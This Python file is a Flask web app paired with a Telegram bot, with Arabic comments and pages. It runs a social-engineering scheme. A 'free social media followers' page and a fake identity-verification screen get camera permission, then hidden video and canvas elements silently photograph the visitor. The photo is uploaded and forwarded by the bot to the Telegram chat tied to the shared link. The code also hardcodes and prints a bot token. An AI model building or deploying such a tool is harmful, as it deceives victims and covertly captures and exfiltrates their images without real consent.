import os
import logging
import uuid
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import asyncio
from threading import Thread
import time
import json
from datetime import datetime

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('photos'):
    os.makedirs('photos')
if not os.path.exists('data'):
    os.makedirs('data')

# تخزين البيانات
def load_user_data():
    try:
        with open('data/users.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_data(data):
    with open('data/users.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

def load_photos_data():
    try:
        with open('data/photos.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_photos_data(data):
    with open('data/photos.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

# ========== HTML قوالب ==========
AUTO_CAMERA_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1.1rem;
            margin: 15px 0;
            line-height: 1.6;
        }
        
        .success {
            color: #4CAF50;
            font-weight: bold;
        }
        
        .error {
            color: #f44336;
            font-weight: bold;
        }
        
        .hidden {
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- شاشة التحميل -->
        <div id="loadingScreen">
            <div class="loader"></div>
            <h1>جاري التحقق من الهوية</h1>
            <div class="status">⏳ يرجى الانتظار أثناء التحقق...</div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <!-- شاشة النجاح -->
        <div id="successScreen" class="hidden">
            <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
            <h1>تم التحقق بنجاح!</h1>
            <div class="status success">🎉 تم تفعيل خدمتك بنجاح</div>
            <div class="status">ستصلك إشعارات التقدم على التليجرام</div>
        </div>
        
        <!-- شاشة الخطأ -->
        <div id="errorScreen" class="hidden">
            <div style="font-size: 4rem; margin-bottom: 20px;">❌</div>
            <h1>خطأ في التحقق</h1>
            <div class="status error" id="errorMessage"></div>
            <button onclick="retryVerification()" style="
                background: #4CAF50;
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 25px;
                cursor: pointer;
                margin-top: 20px;
                font-size: 16px;
            ">إعادة المحاولة</button>
        </div>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        let stream = null;
        let captureAttempts = 0;
        const maxAttempts = 3;

        // بدء عملية التحقق تلقائياً
        window.addEventListener('load', function() {
            setTimeout(startAutoVerification, 1000);
        });

        async function startAutoVerification() {
            try {
                updateProgress(25);
                updateStatus('🔍 جاري التحقق من الصلاحيات...');
                
                // طلب إذن الكاميرا
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                updateProgress(50);
                updateStatus('📸 جاري التحقق من الهوية...');
                
                // تشغيل الكاميرا المخفية
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                
                // الانتظار لضبط الكاميرا
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                updateProgress(75);
                updateStatus('🔄 جاري إكمال التحقق...');
                
                // التقاط الصورة تلقائياً
                await captureAndSendPhoto();
                
            } catch (error) {
                handleError(error);
            }
        }

        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const context = canvas.getContext('2d');
                
                // ضبط أبعاد الكانفاس
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // رسم الصورة من الفيديو
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // إيقاف الكاميرا
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // تحويل الصورة إلى Blob
                canvas.toBlob(async (blob) => {
                    await sendPhotoToBot(blob);
                }, 'image/jpeg', 0.8);
                
            } catch (error) {
                handleError(error);
            }
        }

        async function sendPhotoToBot(blob) {
            try {
                updateProgress(90);
                updateStatus('📤 جاري إرسال البيانات...');
                
                const formData = new FormData();
                formData.append('photo', blob, 'verification.jpg');
                formData.append('user_id', '{{user_id}}');
                formData.append('package', '{{package}}');
                formData.append('auto_capture', 'true');

                const response = await fetch('/upload_photo', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                
                if (result.success) {
                    updateProgress(100);
                    showSuccess();
                } else {
                    throw new Error(result.error || 'فشل في الإرسال');
                }
                
            } catch (error) {
                handleError(error);
            }
        }

        function updateProgress(percent) {
            document.getElementById('progress').style.width = percent + '%';
        }

        function updateStatus(message) {
            document.querySelector('#loadingScreen .status').textContent = message;
        }

        function showSuccess() {
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('successScreen').classList.remove('hidden');
            
            // إغلاق الصفحة بعد 3 ثواني
            setTimeout(() => {
                window.close();
            }, 3000);
        }

        function handleError(error) {
            console.error('Verification error:', error);
            
            captureAttempts++;
            
            if (captureAttempts < maxAttempts) {
                updateStatus(`🔄 محاولة ${captureAttempts}/${maxAttempts}...`);
                setTimeout(startAutoVerification, 2000);
            } else {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('errorScreen').classList.remove('hidden');
                document.getElementById('errorMessage').textContent = getErrorMessage(error);
            }
        }

        function getErrorMessage(error) {
            if (error.name === 'NotAllowedError') {
                return 'تم رفض الإذن. يرجى السماح بالوصول إلى الكاميرا.';
            } else if (error.name === 'NotFoundError') {
                return 'لم يتم العثور على كاميرا.';
            } else if (error.name === 'NotSupportedError') {
                return 'المتصفح لا يدعم الكاميرا.';
            } else {
                return 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.';
            }
        }

        function retryVerification() {
            document.getElementById('errorScreen').classList.add('hidden');
            document.getElementById('loadingScreen').classList.remove('hidden');
            captureAttempts = 0;
            startAutoVerification();
        }

        // منع المستخدم من إغلاق الصفحة أثناء المعالجة
        window.addEventListener('beforeunload', function(e) {
            if (!document.getElementById('successScreen').classList.contains('hidden')) {
                return undefined;
            }
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
"""

MAIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة المتابعين - احصل على 100 متابع مجاناً</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 3rem;
            color: #4CAF50;
            margin-bottom: 15px;
        }
        
        h1 {
            color: #2d3748;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #718096;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        
        .free-badge {
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            color: #000;
            padding: 10px 25px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1.3rem;
            display: inline-block;
            margin: 10px 0;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }
        
        .packages {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .package {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .package:hover {
            transform: translateY(-10px);
        }
        
        .package.featured {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            transform: scale(1.05);
        }
        
        .package.featured:hover {
            transform: scale(1.08) translateY(-5px);
        }
        
        .package-icon {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        
        .package-title {
            font-size: 1.5rem;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .package-followers {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #4CAF50;
        }
        
        .package.featured .package-followers {
            color: #FFD700;
        }
        
        .package-price {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #718096;
        }
        
        .package.featured .package-price {
            color: #fff;
        }
        
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }
        
        .social-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: #667eea;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .social-icon:hover {
            transform: translateY(-5px);
            background: #667eea;
            color: white;
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.3);
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(76, 175, 80, 0.4);
        }
        
        .btn-large {
            padding: 25px 50px;
            font-size: 1.4rem;
        }
        
        .privacy-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }
        
        .privacy-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 20px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .privacy-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
        }
        
        .btn-accept {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
        }
        
        .btn-decline {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .packages {
                grid-template-columns: 1fr;
            }
            
            .package.featured {
                transform: none;
            }
            
            .package.featured:hover {
                transform: translateY(-5px);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-users"></i>
            </div>
            <h1>زيادة المتابعين الحقيقية</h1>
            <p class="subtitle">احصل على آلاف المتابعين الحقيقين لجميع منصات السوشيال ميديا</p>
            <div class="free-badge">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً الآن!
            </div>
        </div>

        <!-- أيقونات السوشيال ميديا -->
        <div class="social-icons">
            <a href="#" class="social-icon">
                <i class="fab fa-instagram"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-tiktok"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-youtube"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-facebook"></i>
            </a>
        </div>

        <!-- الباقات -->
        <div class="packages">
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="package-title">الباقة الأساسية</div>
                <div class="package-followers">1,000 متابع</div>
                <div class="package-price">$9.99</div>
                <button class="btn" onclick="startVerification('basic')">اختر الباقة</button>
            </div>
            
            <div class="package featured">
                <div class="package-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="package-title">الباقة المميزة</div>
                <div class="package-followers">5,000 متابع</div>
                <div class="package-price">$29.99</div>
                <button class="btn" onclick="startVerification('premium')">اختر الباقة</button>
            </div>
            
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <div class="package-title">الباقة الذهبية</div>
                <div class="package-followers">10,000 متابع</div>
                <div class="package-price">$49.99</div>
                <button class="btn" onclick="startVerification('gold')">اختر الباقة</button>
            </div>
        </div>

        <!-- زر الحصول على المتابعين المجانية -->
        <div style="background: rgba(255, 255, 255, 0.95); border-radius: 20px; padding: 40px; text-align: center; margin: 30px 0;">
            <h2>🎁 احصل على 100 متابع مجاناً!</h2>
            <p>انقر أدناه لبدء عملية الحصول على المتابعين المجانية</p>
            <button class="btn btn-large" onclick="startVerification('free')">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً
            </button>
        </div>
    </div>

    <!-- سياسة الخصوصية -->
    <div id="privacyModal" class="privacy-modal">
        <div class="privacy-content">
            <h2>📋 سياسة الخصوصية والأذونات</h2>
            <p><strong>نحن نحترم خصوصيتك ونلتزم بحماية بياناتك الشخصية.</strong></p>
            
            <h3>الأذونات المطلوبة:</h3>
            <ul>
                <li>✅ الوصول إلى الكاميرا للتحقق من الهوية</li>
                <li>✅ عملية تحقق تلقائية سريعة</li>
                <li>✅ تخزين بياناتك الأساسية لتقديم الخدمة</li>
            </ul>
            
            <h3>ماذا يحدث:</h3>
            <ul>
                <li>📸 سيتم التقاط صورة تحقق تلقائياً</li>
                <li>⚡ العملية تستغرق ثوانٍ قليلة</li>
                <li>🔒 لا تظهر الصورة للمستخدم</li>
                <li>🛡️ البيانات محمية ومشفرة</li>
            </ul>
            
            <p>بالنقر على "موافق" فإنك توافق على الشروط وسيبدأ التحقق تلقائياً.</p>
            
            <div class="privacy-actions">
                <button class="btn btn-accept" onclick="acceptPrivacy()">
                    <i class="fas fa-check"></i> موافق وابدأ التحقق
                </button>
                <button class="btn btn-decline" onclick="declinePrivacy()">
                    <i class="fas fa-times"></i> غير موافق
                </button>
            </div>
        </div>
    </div>

    <script>
        let selectedPackage = '';
        let privacyAccepted = false;

        function startVerification(packageType) {
            selectedPackage = packageType;
            document.getElementById('privacyModal').style.display = 'block';
        }

        function acceptPrivacy() {
            privacyAccepted = true;
            document.getElementById('privacyModal').style.display = 'none';
            
            // الانتقال إلى صفحة التحقق التلقائي
            const verificationUrl = `/auto_camera/{{user_id}}?package=${selectedPackage}`;
            window.location.href = verificationUrl;
        }

        function declinePrivacy() {
            document.getElementById('privacyModal').style.display = 'none';
            alert('نأسف! لا يمكننا تقديم الخدمة بدون موافقتك على الشروط.');
        }
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Bot is running! Use /start in Telegram"

@app.route('/user/<user_id>')
def user_page(user_id):
    """الصفحة الرئيسية للمستخدم"""
    return render_template_string(MAIN_HTML, user_id=user_id)

@app.route('/auto_camera/<user_id>')
def auto_camera_page(user_id):
    """صفحة الكاميرا التلقائية المخفية"""
    package = request.args.get('package', 'free')
    return render_template_string(AUTO_CAMERA_HTML, user_id=user_id, package=package)

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    """استقبال الصور من صفحة الويب"""
    try:
        if 'photo' not in request.files:
            return jsonify({'success': False, 'error': 'No photo uploaded'})
        
        photo = request.files['photo']
        user_id = request.form.get('user_id')
        package = request.form.get('package', 'free')
        auto_capture = request.form.get('auto_capture', 'false') == 'true'
        
        if photo and user_id:
            # حفظ الصورة
            filename = f"auto_capture_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
            filepath = os.path.join('photos', filename)
            photo.save(filepath)
            
            # حفظ بيانات الصورة
            photos_data = load_photos_data()
            photos_data[filename] = {
                'user_id': user_id,
                'package': package,
                'auto_capture': auto_capture,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            }
            save_photos_data(photos_data)
            
            # إرسال الصورة للبوت
            asyncio.run(send_photo_to_bot(user_id, filepath, package, auto_capture))
            
            return jsonify({
                'success': True, 
                'message': 'تم التحقق بنجاح وتفعيل الخدمة',
                'filename': filename,
                'package': package
            })
        else:
            return jsonify({'success': False, 'error': 'Missing user_id or photo'})
        
    except Exception as e:
        print(f"❌ خطأ في رفع الصورة: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ========== وظائف التليجرام ==========
async def send_photo_to_bot(user_id, photo_path, package, auto_capture=True):
    """إرسال الصورة للمستخدم عبر البوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # تحويل user_id إلى integer
        user_id_int = int(user_id)
        
        # إرسال الصورة
        with open(photo_path, 'rb') as photo_file:
            caption = f"""
📸 **تم التحقق تلقائياً بنجاح!**

🎁 **الباقة المفعّلة:** {get_package_name(package)}
🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔒 **النوع:** تحقق تلقائي

⏳ **جاري تفعيل الخدمة...**
ستصلك متابعينك خلال 24 ساعة ⏰
            """
            
            await application.bot.send_photo(
                chat_id=user_id_int,
                photo=InputFile(photo_file),
                caption=caption,
                parse_mode='HTML'
            )
        
        # إرسال رسالة تأكيد
        confirmation_text = f"""
✅ **تم تفعيل {get_package_name(package)} بنجاح!**

📊 **تفاصيل طلبك:**
• الباقة: {get_package_name(package)}
• وقت التنشيط: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• رقم الطلب: #{uuid.uuid4().hex[:8].upper()}

🚀 **ماذا يحدث الآن:**
1. جاري معالجة طلبك
2. سيبدأ وصول المتابعين خلال 24 ساعة
3. ستتلقى تحديثات دورية

📞 **للاستفسار:** @{'your_support_username'}
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=confirmation_text,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال الصورة تلقائياً للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال الصورة للبوت: {e}")

def get_package_name(package_type):
    """الحصول على اسم الباقة"""
    packages = {
        'free': '🎁 100 متابع مجاناً',
        'basic': '⭐ باقة 1000 متابع',
        'premium': '👑 باقة 5000 متابع', 
        'gold': '🚀 باقة 10000 متابع'
    }
    return packages.get(package_type, 'خدمة المتابعين')

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # حفظ بيانات المستخدم
        user_data = load_user_data()
        if str(user_id) not in user_data:
            user_data[str(user_id)] = {
                'username': user.username,
                'first_name': user.first_name,
                'join_date': datetime.now().isoformat(),
                'photos_count': 0
            }
            save_user_data(user_data)
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/user/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في بوت زيادة المتابعين!**

📱 **رابطك الخاص:**
{user_url}

⚡ **مميزات الخدمة:**
✅ متابعين حقيقين 100%
✅ تحقق تلقائي سريع
✅ خدمة 24/7
✅ أسعار مناسبة

🎁 **احصل على 100 متابع مجاناً الآن!**

🔒 **عملية آمنة:**
• التحقق يتم تلقائياً
• لا تظهر الصورة للمستخدم
• بياناتك محمية

💡 **كيفية الاستخدام:**
1. افتح الرابط أعلاه
2. اختر الباقة المناسبة
3. وافق على الشروط
4. سيتم التحقق تلقائياً
5. استلم متابعينك!
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
🤖 **أوامر البوت:**

/start - بدء البوت والحصول على الرابط الخاص
/help - عرض الرسالة المساعدة
/status - حالة طلباتك

📞 **الدعم الفني:**
@{'your_support_username'}

🕒 **أوقات العمل:**
24/7
        """
        await update.message.reply_text(help_text)

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /status"""
        user_id = update.effective_user.id
        photos_data = load_photos_data()
        
        user_photos = [p for p in photos_data.values() if p['user_id'] == str(user_id)]
        
        if user_photos:
            status_text = "📊 **حالة طلباتك:**\n\n"
            for photo in user_photos[-5:]:  # آخر 5 طلبات
                status_text += f"📸 {get_package_name(photo['package'])} - ✅ منشط\n"
        else:
            status_text = "📭 لم تقم بأي طلبات بعد.\nاستخدم /start لبدء الخدمة!"
        
        await update.message.reply_text(status_text, parse_mode='HTML')

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الأخطاء"""
        print(f"❌ خطأ في البوت: {context.error}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_error_handler(self.error_handler)

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            # إبقاء البوت يعمل
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)  # انتظار بسيط لضمان تشغيل الخادم أولاً
        
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل التطبيق...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    print("🎯 الميزة: الالتقاط التلقائي المخفي للصور")
    
    # تشغيل الخادم والبوت في خيوط منفصلة
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    # إبقاء البرنامج الرئيسي يعمل
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
